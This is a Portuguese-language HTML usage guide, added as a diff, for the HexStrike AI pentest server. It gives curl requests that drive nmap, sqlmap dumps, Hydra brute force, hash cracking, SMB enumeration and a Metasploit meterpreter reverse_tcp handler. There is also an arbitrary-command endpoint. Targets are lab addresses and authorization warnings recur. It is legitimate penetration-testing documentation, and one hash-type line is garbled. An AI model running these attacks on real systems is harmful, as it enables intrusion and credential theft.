@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GUIA HEXSTRIKE — TODAS AS FERRAMENTAS</title>
+<style>
+  body{font-family:Georgia,serif;max-width:950px;margin:0 auto;padding:18px;line-height:1.65;color:#1a1a1a;background:#0d0d0f;color:#e0e0e0}
+  h1{font-size:1.5em;border-bottom:3px solid #238636;padding-bottom:8px;color:#3fb950}
+  h2{border-bottom:1px solid #444;padding-bottom:4px;margin-top:2em;color:#58a6ff}
+  h3{color:#d2a8ff}
+  pre{position:relative;background:#161b22;color:#c9d1d9;padding:14px;border-radius:8px;overflow-x:auto;white-space:pre-wrap;border:1px solid #30363d}
+  code{font-family:Menlo,monospace;font-size:.88em}
+  p>code,li>code{background:#21262d;padding:1px 5px;border-radius:4px;color:#ffa657}
+  .copy-btn{position:absolute;top:6px;right:6px;background:#238636;color:#fff;border:none;border-radius:5px;padding:4px 10px;cursor:pointer;font-size:12px;font-family:sans-serif}
+  .copy-btn:hover{background:#2ea043}
+  a{color:#58a6ff}
+  .copy-link{margin-left:6px;font-size:11px;color:#fff;background:#0969da;border:none;border-radius:4px;padding:2px 8px;cursor:pointer}
+  .card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:14px;margin:14px 0}
+  .tag{display:inline-block;background:#238636;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-family:sans-serif;margin-right:6px}
+  .warn{background:#3d2e00;border:1px solid #9e6a03;border-radius:6px;padding:10px 14px;margin:10px 0}
+  table{border-collapse:collapse;width:100%;margin:10px 0}
+  td,th{border:1px solid #30363d;padding:6px 10px;text-align:left;font-size:.9em}
+  th{background:#21262d}
+  hr{border:none;border-top:1px solid #30363d;margin:2em 0}
+</style>
+</head>
+<body>
+
+<h1>GUIA HEXSTRIKE — TODAS AS FERRAMENTAS</h1>
+<p><strong>Servidor:</strong> <code>http://127.0.0.1:8888</code> · <strong>Método:</strong> POST + JSON · <strong>Alvo dos exemplos:</strong> sempre local/laboratório (<code>127.0.0.1</code>, <code>10.0.0.x</code>) — substitua pelo alvo autorizado do seu teste.</p>
+
+<div class="warn"><strong>Regra de ouro:</strong> cada rota aceita campos JSON específicos. Antes de inventar campos, descubra a implementação real:
+<pre>grep -n "api/tools/NOME" hexstrike_server.py
+sed -n 'LINHA,LINHA+40p' hexstrike_server.py</pre></div>
+
+<h2 id="base">Base — verificar servidor e listar rotas</h2>
+<pre>curl -s http://127.0.0.1:8888/health</pre>
+<pre>grep -nE '@app\.route' ~/cerebrocaine/hexstrike-ai/hexstrike_server.py | head -100</pre>
+<pre>curl -s -X POST http://127.0.0.1:8888/api/command \
+  -H "Content-Type: application/json" \
+  -d '{"command":"echo teste"}'</pre>
+
+<h2 id="nmap">1. Nmap — recon e varredura</h2>
+<div class="card"><span class="tag">recon</span><span class="tag">rede</span>
+<p>Usos: descoberta de hosts, portas, versões de serviço, scripts NSE.</p>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"127.0.0.1","scan_type":"-sV","ports":"80,443"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.0/24","scan_type":"-sn","ports":""}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","scan_type":"-sV --script vuln","ports":"1-1000"}'</pre>
+<p>Dica de <code>scan_type</code>: <code>-sV</code> versões · <code>-sn</code> só hosts vivos · <code>-sU</code> UDP · <code>-O</code> SO · <code>-A</code> agressivo.</p>
+</div>
+
+<h2 id="dirb">2. Dirb — descoberta de diretórios web</h2>
+<div class="card"><span class="tag">web</span><span class="tag">enum</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/dirb \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080","wordlist":"/usr/share/wordlists/dirb/common.txt"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/dirb \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080","wordlist":"/usr/share/wordlists/dirb/big.txt","additional_args":"-o /tmp/dirb_saida.txt"}'</pre>
+<p>Instale as wordlists se faltarem: <code>sudo apt install -y dirb</code>.</p>
+</div>
+
+<h2 id="ffuf">3. FFUF — fuzzing web rápido</h2>
+<div class="card"><span class="tag">web</span><span class="tag">fuzz</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/ffuf \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/FUZZ","wordlist":"/usr/share/wordlists/dirb/common.txt"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/ffuf \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/FUZZ","wordlist":"/usr/share/wordlists/dirb/common.txt","additional_args":"-mc 200,301 -t 40"}'</pre>
+<p>Fuzz de parâmetro (troque FUZZ pela posição):</p>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/ffuf \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/busca?user=FUZZ","wordlist":"/usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt","additional_args":"-fs 0"}'</pre>
+</div>
+
+<h2 id="nikto">4. Nikto — scan de vulnerabilidades web</h2>
+<div class="card"><span class="tag">web</span><span class="tag">vuln</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nikto \
+  -H "Content-Type: application/json" \
+  -d '{"target":"http://127.0.0.1:8080"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/nikto \
+  -H "Content-Type: application/json" \
+  -d '{"target":"http://127.0.0.1:8080","additional_args":"-Format txt -output /tmp/nikto.txt"}'</pre>
+<p>Nikto é ruidoso: use só em lab ou com autorização explícita — IDS/IPS detectam na hora.</p>
+</div>
+
+<h2 id="sqlmap">5. SQLmap — exploração de SQL injection</h2>
+<div class="card"><span class="tag">web</span><span class="tag">exploit</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/sqlmap \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/item.php?id=1"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/sqlmap \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/item.php?id=1","additional_args":"--batch --dbs"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/sqlmap \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/login","data":"user=admin&pass=test","additional_args":"--batch --forms --dump"}'</pre>
+<p><code>--forms</code> detecta formulários · <code>-r arquivo.txt</code> usa requisição salva do Burp · <code>--batch</code> responde tudo automaticamente (só em lab).</p>
+</div>
+
+<h2 id="wpscan">6. WPScan — auditoria de WordPress</h2>
+<div class="card"><span class="tag">web</span><span class="tag">cms</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/wpscan \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/wordpress"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/wpscan \
+  -H "Content-Type: application/json" \
+  -d '{"url":"http://127.0.0.1:8080/wordpress","additional_args":"--enumerate u,ap,at --api-token SEU_TOKEN"}'</pre>
+<p>Enumera usuários (<code>u</code>), plugins vulneráveis (<code>vp</code>) e temas (<code>vt</code>). Token da API em <a href="https://wpscan.com">wpscan.com</a> para obter dados de vulnerabilidade.</p>
+</div>
+
+<h2 id="hydra">7. Hydra — brute force de autenticação</h2>
+<div class="card"><span class="tag">credenciais</span><span class="tag">lab</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/hydra \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","service":"ssh","username":"admin","password_file":"/usr/share/wordlists/rockyou.txt","additional_args":"-t 4 -f -V"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/hydra \
+  -H "Content-Type: application/json" \
+  -d '{"target":"127.0.0.1","service":"http-post-form","username":"admin","password_file":"/tmp/pass.txt","additional_args":"/:user=^USER^&pass=^PASS^:F=FALHOU -t 2 -V"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/hydra \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","service":"ftp","username_file":"/tmp/users.txt","password_file":"/tmp/pass.txt","additional_args":"-t 4"}'</pre>
+<p>Serviços comuns: <code>ssh</code> <code>ftp</code> <code>smb</code> <code>http-get</code> <code>http-post-form</code> <code>mysql</code> <code>rdp</code>. Wordlist pequena primeiro; rockyou inteiro estoura o timeout de 300s do server.</p>
+</div>
+
+<h2 id="john">8. John the Ripper — quebra de senhas offline</h2>
+<div class="card"><span class="tag">senhas</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/john \
+  -H "Content-Type: application/json" \
+  -d '{"hash_file":"/tmp/hashes.txt"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/john \
+  -H "Content-Type: application/json" \
+  -d '{"hash_file":"/tmp/hashes.txt","wordlist":"/usr/share/wordlists/rockyou.txt","additional_args":"--format=Raw-MD5"}'</pre>
+<p>Formatos comuns: <code>Raw-MD5</code> <code>Raw-SHA256</code> <code>md5crypt</code> <code>sha512crypt</code> <code>zip</code> <code>nt</code>. Mostre o que quebrou: <code>john --show /tmp/hashes.txt</code>.</p>
+</div>
+
+<h2 id="hashcat">9. Hashcat — quebra de senhas com GPU/CPU</h2>
+<div class="card"><span class="tag">senhas</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/hashcat \
+  -H "Content-Type: application/json" \
+  -d '{"hash":"e10adc3949ba59abbe56e057f20f883e","hash_type":"0","attack_mode":"0","wordlist":"/usr/share/wordlists/rockyou.txt"}'</pre>
+<p>Referência rápida de <code>hash_type</code>: 0=MD5 · 100=SHA1 · 1400=SHA256 · 0=NTLM é 1000 · 3200=bcrypt. Rode <code>hashcat --example-hashes</code> para a lista completa. No Termux hashcat não funciona (sem GPU/OpenCL) — use o John.</p>
+</div>
+
+<h2 id="metasploit">10. Metasploit — framework de exploração</h2>
+<div class="card"><span class="tag">exploit</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/metasploit \
+  -H "Content-Type: application/json" \
+  -d '{"action":"search","module":"vsftpd"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/metasploit \
+  -H "Content-Type: application/json" \
+  -d '{"action":"use","module":"exploit/multi/handler","options":{"PAYLOAD":"linux/x64/meterpreter/reverse_tcp","LHOST":"127.0.0.1","LPORT":"4444"}}'</pre>
+<p>No seu servidor local 8888, o handler pode rodar via <code>msfconsole -q -x "..."</code> — confira a assinatura exata da rota no código antes de montar o JSON.</p>
+</div>
+
+<h2 id="enum4linux">11. Enum4linux — enumeração Windows/Samba</h2>
+<div class="card"><span class="tag">smb</span><span class="tag">rede</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/enum4linux \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","additional_args":"-a"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/enum4linux \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","additional_args":"-U -S"}'</pre>
+<p><code>-U</code> usuários · <code>-S</code> shares · <code>-P</code> política de senhas · <code>-a</code> tudo.</p>
+</div>
+
+<h2 id="smbmap">12. SMBmap — mapeamento de shares SMB</h2>
+<div class="card"><span class="tag">smb</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/smbmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/smbmap \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","username":"guest","password":"guest","additional_args":"-R"}'</pre>
+<p><code>-R</code> lista conteúdo recursivo dos shares legíveis.</p>
+</div>
+
+<h2 id="netexec">13. NetExec (antigo CrackMapExec) — suíte SMB/WinRM/LDAP</h2>
+<div class="card"><span class="tag">rede</span><span class="tag">windows</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/netexec \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.0/24","protocol":"smb"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/netexec \
+  -H "Content-Type: application/json" \
+  -d '{"target":"10.0.0.5","protocol":"smb","username":"admin","password":"senha","additional_args":"--shares"}'</pre>
+<p>Protocolos: <code>smb</code> <code>winrm</code> <code>ldap</code> <code>mssql</code> <code>ssh</code> <code>ftp</code>.</p>
+</div>
+
+<h2 id="amass">14. Amass — enumeração de superfície externa</h2>
+<div class="card"><span class="tag">osint</span><span class="tag">dns</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/amass \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"example.com","mode":"enum"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/amass \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"example.com","mode":"enum","additional_args":"-passive"}'</pre>
+<p><code>-passive</code> só usa fontes públicas (mais seguro/discreto); sem ele faz resolução ativa e brute de DNS.</p>
+</div>
+
+<h2 id="subfinder">15. Subfinder — descoberta de subdomínios</h2>
+<div class="card"><span class="tag">osint</span><span class="tag">dns</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/subfinder \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"example.com"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/subfinder \
+  -H "Content-Type: application/json" \
+  -d '{"domain":"example.com","additional_args":"-o /tmp/subs.txt -silent"}'</pre>
+</div>
+
+<h2 id="terrascan">16. Terrascan — auditoria de Infrastructure as Code</h2>
+<div class="card"><span class="tag">cloud</span><span class="tag">iac</span>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/terrascan \
+  -H "Content-Type: application/json" \
+  -d '{"scan_type":"terraform","directory":"./infra"}'</pre>
+<pre>curl -sS -X POST http://127.0.0.1:8888/api/tools/terrascan \
+  -H "Content-Type: application/json" \
+  -d '{"scan_type":"k8s","directory":"./manifests"}'</pre>
+<p>Tipos: <code>terraform</code> <code>k8s</code> <code>docker</code> <code>arm</code> <code>cloudformation</code>.</p>
+</div>
+
+<h2 id="workflow">Workflow completo — recon até exploit (ordem recomendada)</h2>
+<pre>1. Nmap -sV        -> quais portas/servicos existem
+2. Nmap --script   -> vulnerabilidades conhecidas dos servicos
+3. Dirb/FFUF       -> diretorios e endpoints escondidos
+4. Nikto           -> misconfigurations do servidor web
+5. SQLmap          -> testar parametros para injecao
+6. Hydra           -> teste de credenciais (apenas com autorizacao)
+7. John/Hashcat    -> hashes capturados em lab
+8. Metasploit      -> exploit confirmado com versao vulneravel</pre>
+
+<h2 id="tips">Dicas gerais</h2>
+<ul>
+<li><strong>Timeout do server é 300s</strong>: tarefas longas (rockyou inteiro, amass full) estouram. Rode em chunks ou direto no terminal.</li>
+<li><strong>Ferramenta ausente</strong>: a resposta vem com erro no <code>stderr</code>. Confira com <code>command -v ferramenta</code> e instale.</li>
+<li><strong>Cache</strong>: requisições idênticas podem vir do cache; adicione um parâmetro variável ou limpe o cache via <code>/api/cache/stats</code> para testes repetidos.</li>
+<li><strong>Monitoramento</strong>: <code>GET /api/processes/list</code> mostra processos em execução; <code>POST /api/processes/terminate/&lt;pid&gt;</code> encerra.</li>
+<li><strong>Escopo</strong>: todos os exemplos apontam para localhost/lab. Substituir o alvo sem autorização explícita é ilegal em quase toda jurisdição.</li>
+</ul>
+
+<h2>Referências</h2>
+<p><a href="https://github.com/0x4m4/hexstrike-ai">HexStrike AI</a> · <a href="https://nmap.org/book/man.html">Nmap</a> · <a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a> · <a href="https://github.com/sqlmapproject/sqlmap">SQLmap</a> · <a href="https://labs.offsec.com/">OffSec labs</a></p>
+
+<script>
+document.querySelectorAll('pre').forEach(function(pre){
+  var btn=document.createElement('button');
+  btn.className='copy-btn';
+  btn.textContent='Copiar';
+  btn.onclick=function(){
+    navigator.clipboard.writeText(pre.innerText.replace(/^Copiar\n?/,'')).then(function(){
+      btn.textContent='Copiado!';
+      setTimeout(function(){btn.textContent='Copiar';},1500);
+    });
+  };
+  pre.appendChild(btn);
+});
+document.querySelectorAll('a[href^="http"]').forEach(function(a){
+  var btn=document.createElement('button');
+  btn.className='copy-link';
+  btn.textContent='Copiar link';
+  btn.onclick=function(e){
+    e.preventDefault();
+    navigator.clipboard.writeText(a.href).then(function(){
+      btn.textContent='Copiado!';
+      setTimeout(function(){btn.textContent='Copiar link';},1500);
+    });
+  };
+  a.parentNode.insertBefore(btn,a.nextSibling);
+});
+</script>
+</body>
+</html>
